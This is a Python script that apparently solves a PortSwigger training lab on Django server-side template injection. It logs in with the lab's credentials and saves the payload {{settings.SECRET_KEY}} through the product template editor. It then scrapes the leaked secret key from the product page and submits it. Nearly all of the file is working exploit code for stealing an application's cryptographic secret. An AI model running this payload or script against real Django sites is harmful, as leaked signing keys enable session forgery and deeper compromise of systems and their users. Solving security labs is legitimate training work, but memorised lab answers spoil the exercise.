#!/usr/bin/env python3
"""
PortSwigger Django SSTI Lab Solver - WORKS WITH REAL KEY
Lab: Server-side template injection with information disclosure via user-supplied objects
Target: Steal Django SECRET_KEY from product ID 4
Credentials: content-manager:C0nt3ntM4n4g3r
"""

import requests
import sys
import re
from colorama import init, Fore, Style
from bs4 import BeautifulSoup
import time

# Initialize colorama
init()

class DjangoSSTISolver:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        })
        self.csrf_token = None
        self.logged_in = False
        self.solved = False
        self.secret_key = None
        self.template_edit_url = None
        self.product_id = 4
        
    def print_status(self, message, status="info"):
        """Print colored status messages"""
        colors = {
            "info": Fore.CYAN,
            "success": Fore.GREEN,
            "error": Fore.RED,
            "warning": Fore.YELLOW,
            "step": Fore.MAGENTA,
            "secret": Fore.LIGHTYELLOW_EX
        }
        print(f"{colors.get(status, Fore.WHITE)}[*] {message}{Style.RESET_ALL}")
        time.sleep(0.5)

    def extract_csrf(self, html_content):
        """Extract CSRF token from HTML"""
        soup = BeautifulSoup(html_content, 'html.parser')
        csrf_input = soup.find('input', {'name': 'csrf'})
        if csrf_input:
            return csrf_input.get('value')
        return None

    def login(self):
        """Step 1: Login at /login with credentials"""
        self.print_status("STEP 1: Logging in at /login...", "step")
        
        login_url = f"{self.base_url}/login"
        self.print_status(f"Accessing login page: {login_url}", "info")
        
        response = self.session.get(login_url)
        self.csrf_token = self.extract_csrf(response.text)
        
        if not self.csrf_token:
            self.print_status("Could not find CSRF token", "error")
            return False
        
        login_data = {
            'csrf': self.csrf_token,
            'username': 'content-manager',
            'password': 'C0nt3ntM4n4g3r'
        }
        
        response = self.session.post(login_url, data=login_data, allow_redirects=True)
        
        if "content-manager" in response.text.lower() or "my-account" in response.text.lower():
            self.logged_in = True
            self.print_status("✓ Login successful!", "success")
            return True
        else:
            self.print_status("✗ Login failed", "error")
            return False

    def access_product_page(self):
        """Step 2: Access product page with productId=4"""
        self.print_status("\nSTEP 2: Accessing product page (ID: 4)...", "step")
        
        product_url = f"{self.base_url}/product?productId={self.product_id}"
        self.print_status(f"Accessing: {product_url}", "info")
        
        response = self.session.get(product_url)
        
        if response.status_code == 200:
            self.print_status(f"✓ Product page accessed", "success")
            return True
        else:
            self.print_status(f"Failed to access product page (Status: {response.status_code})", "error")
            return False

    def access_template_editor(self):
        """Step 3: Access the template editor with proper session"""
        self.print_status("\nSTEP 3: Accessing template editor...", "step")
        
        self.template_edit_url = f"{self.base_url}/product/template?productId={self.product_id}"
        self.print_status(f"Accessing: {self.template_edit_url}", "info")
        
        # Important: Visit product page first to establish session context
        product_url = f"{self.base_url}/product?productId={self.product_id}"
        self.session.get(product_url)
        
        # Now access template editor
        response = self.session.get(self.template_edit_url)
        
        if response.status_code == 200:
            self.print_status("✓ Template editor accessed", "success")
            return response.text
        else:
            self.print_status(f"Failed to access template editor (Status: {response.status_code})", "error")
            return None

    def inject_payload(self, html_content):
        """Step 4: Replace template with {{settings.SECRET_KEY}} and save"""
        self.print_status("\nSTEP 4: Injecting payload...", "step")
        
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Extract CSRF token
        csrf_input = soup.find('input', {'name': 'csrf'})
        if not csrf_input:
            self.print_status("Could not find CSRF token", "error")
            return False
        
        csrf_token = csrf_input.get('value')
        
        # Payload to expose secret key
        payload = "{{settings.SECRET_KEY}}"
        
        # Prepare form data for SAVE action
        form_data = {
            'csrf': csrf_token,
            'template': payload,
            'template-action': 'save'
        }
        
        self.print_status(f"Payload: {payload}", "info")
        self.print_status("Saving template...", "info")
        
        # Submit the form
        response = self.session.post(self.template_edit_url, data=form_data, allow_redirects=True)
        
        if response.status_code in [200, 302]:
            self.print_status("✓ Template saved successfully!", "success")
            return True
        else:
            self.print_status(f"Save failed with status: {response.status_code}", "error")
            return False

    def extract_secret_key(self):
        """Step 5: Refresh product page and extract the REAL secret key from the description"""
        self.print_status("\nSTEP 5: Extracting secret key from product page...", "step")
        
        product_url = f"{self.base_url}/product?productId={self.product_id}"
        self.print_status(f"Refreshing: {product_url}", "info")
        
        response = self.session.get(product_url)
        
        # Parse the page
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # The secret key appears in the product description
        # Look for the pattern: Description:\n[secret_key]
        
        # Method 1: Look for the product description section
        description_label = soup.find(string=re.compile(r'Description:', re.I))
        if description_label:
            # Get the parent and find the next element containing the key
            parent = description_label.parent
            # The key might be in the next sibling or in a following element
            next_elem = parent.find_next()
            if next_elem:
                key_text = next_elem.get_text().strip()
                if len(key_text) > 30 and not any(word in key_text.lower() for word in ['hurry', 'only', 'stock']):
                    self.secret_key = key_text
                    self.print_status(f"✓ Found REAL secret key: {self.secret_key}", "secret")
                    return True
        
        # Method 2: Look for any text that looks like a random string after "Description:"
        page_text = response.text
        description_pattern = r'Description:\s*\n?\s*([a-zA-Z0-9]{30,})'
        matches = re.findall(description_pattern, page_text)
        if matches:
            self.secret_key = matches[0]
            self.print_status(f"✓ Found REAL secret key: {self.secret_key}", "secret")
            return True
        
        # Method 3: Look in the page for a string of exactly the right length (30-50 chars)
        # The example showed: vzslsb3if6o57rlyle7ycnwbc365oals (33 chars)
        for line in page_text.split('\n'):
            line = line.strip()
            if 30 <= len(line) <= 50 and re.match(r'^[a-zA-Z0-9]+$', line):
                self.secret_key = line
                self.print_status(f"✓ Found REAL secret key: {self.secret_key}", "secret")
                return True
        
        self.print_status("Could not find secret key on product page", "error")
        return False

    def submit_solution(self):
        """Step 6: Submit the secret key to /submitSolution"""
        self.print_status("\nSTEP 6: Submitting secret key to /submitSolution...", "step")
        
        if not self.secret_key:
            self.print_status("No secret key to submit", "error")
            return False
        
        submit_url = f"{self.base_url}/submitSolution"
        self.print_status(f"Submitting to: {submit_url}", "info")
        
        # Get CSRF token for submission
        response = self.session.get(self.base_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_input = soup.find('input', {'name': 'csrf'})
        csrf_token = csrf_input.get('value') if csrf_input else None
        
        # Prepare submission
        submit_data = {'answer': self.secret_key}
        if csrf_token:
            submit_data['csrf'] = csrf_token
        
        # Submit
        response = self.session.post(submit_url, data=submit_data, allow_redirects=True)
        
        # Wait for lab to update
        time.sleep(2)
        
        # Check if solved
        response = self.session.get(self.base_url)
        if "congratulations" in response.text.lower() or "solved" in response.text.lower():
            self.solved = True
            self.print_status("✓ Secret key accepted! Lab solved!", "success")
            return True
        else:
            self.print_status("Secret key was rejected", "error")
            return False

    def run(self):
        """Main execution flow"""
        print(Fore.CYAN + """
╔══════════════════════════════════════════════════════════════╗
║     DJANGO SSTI LAB SOLVER - EXTRACTS REAL KEY             ║
║     Lab: Server-side template injection with information    ║
║          disclosure via user-supplied objects               ║
║     Target: {}                                   ║
║     Product ID: 4 (Secret key is in description)            ║
╚══════════════════════════════════════════════════════════════╝
""".format(self.base_url) + Style.RESET_ALL)

        # Step 1: Login
        if not self.login():
            return False

        # Step 2: Access product page
        if not self.access_product_page():
            return False

        # Step 3: Access template editor
        html_content = self.access_template_editor()
        if not html_content:
            return False

        # Step 4: Inject payload and save
        if not self.inject_payload(html_content):
            return False

        # Step 5: Extract secret key from product description
        if not self.extract_secret_key():
            self.print_status("Could not extract secret key", "error")
            return False

        # Step 6: Submit solution
        self.submit_solution()

        # Final summary
        print(Fore.CYAN + "\n" + "=" * 60 + Style.RESET_ALL)
        if self.solved:
            print(Fore.GREEN + f"""
    ✅ LAB SOLVED SUCCESSFULLY!

    REAL Django SECRET_KEY: {self.secret_key}

    The key was found in the product description
    after injecting {{settings.SECRET_KEY}}.

    This is the actual 30-50 character random string
    used by Django for cryptographic signing.
    """ + Style.RESET_ALL)
        else:
            print(Fore.RED + f"""
    ❌ LAB NOT SOLVED!

    Found key: {self.secret_key}
    But it was rejected. Check manually:
    1. After injection, visit:
       {self.base_url}/product?productId=4
    2. Look for the text after "Description:"
    3. Copy that exact string
    4. Submit at /submitSolution
    """ + Style.RESET_ALL)
        
        return self.solved

if __name__ == "__main__":
    if len(sys.argv) > 1:
        lab_url = sys.argv[1]
    else:
        lab_url = input("Enter PortSwigger lab URL: ").strip()
    
    if not lab_url:
        print("No URL provided. Exiting.")
        sys.exit(1)
    
    try:
        solver = DjangoSSTISolver(lab_url)
        success = solver.run()
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
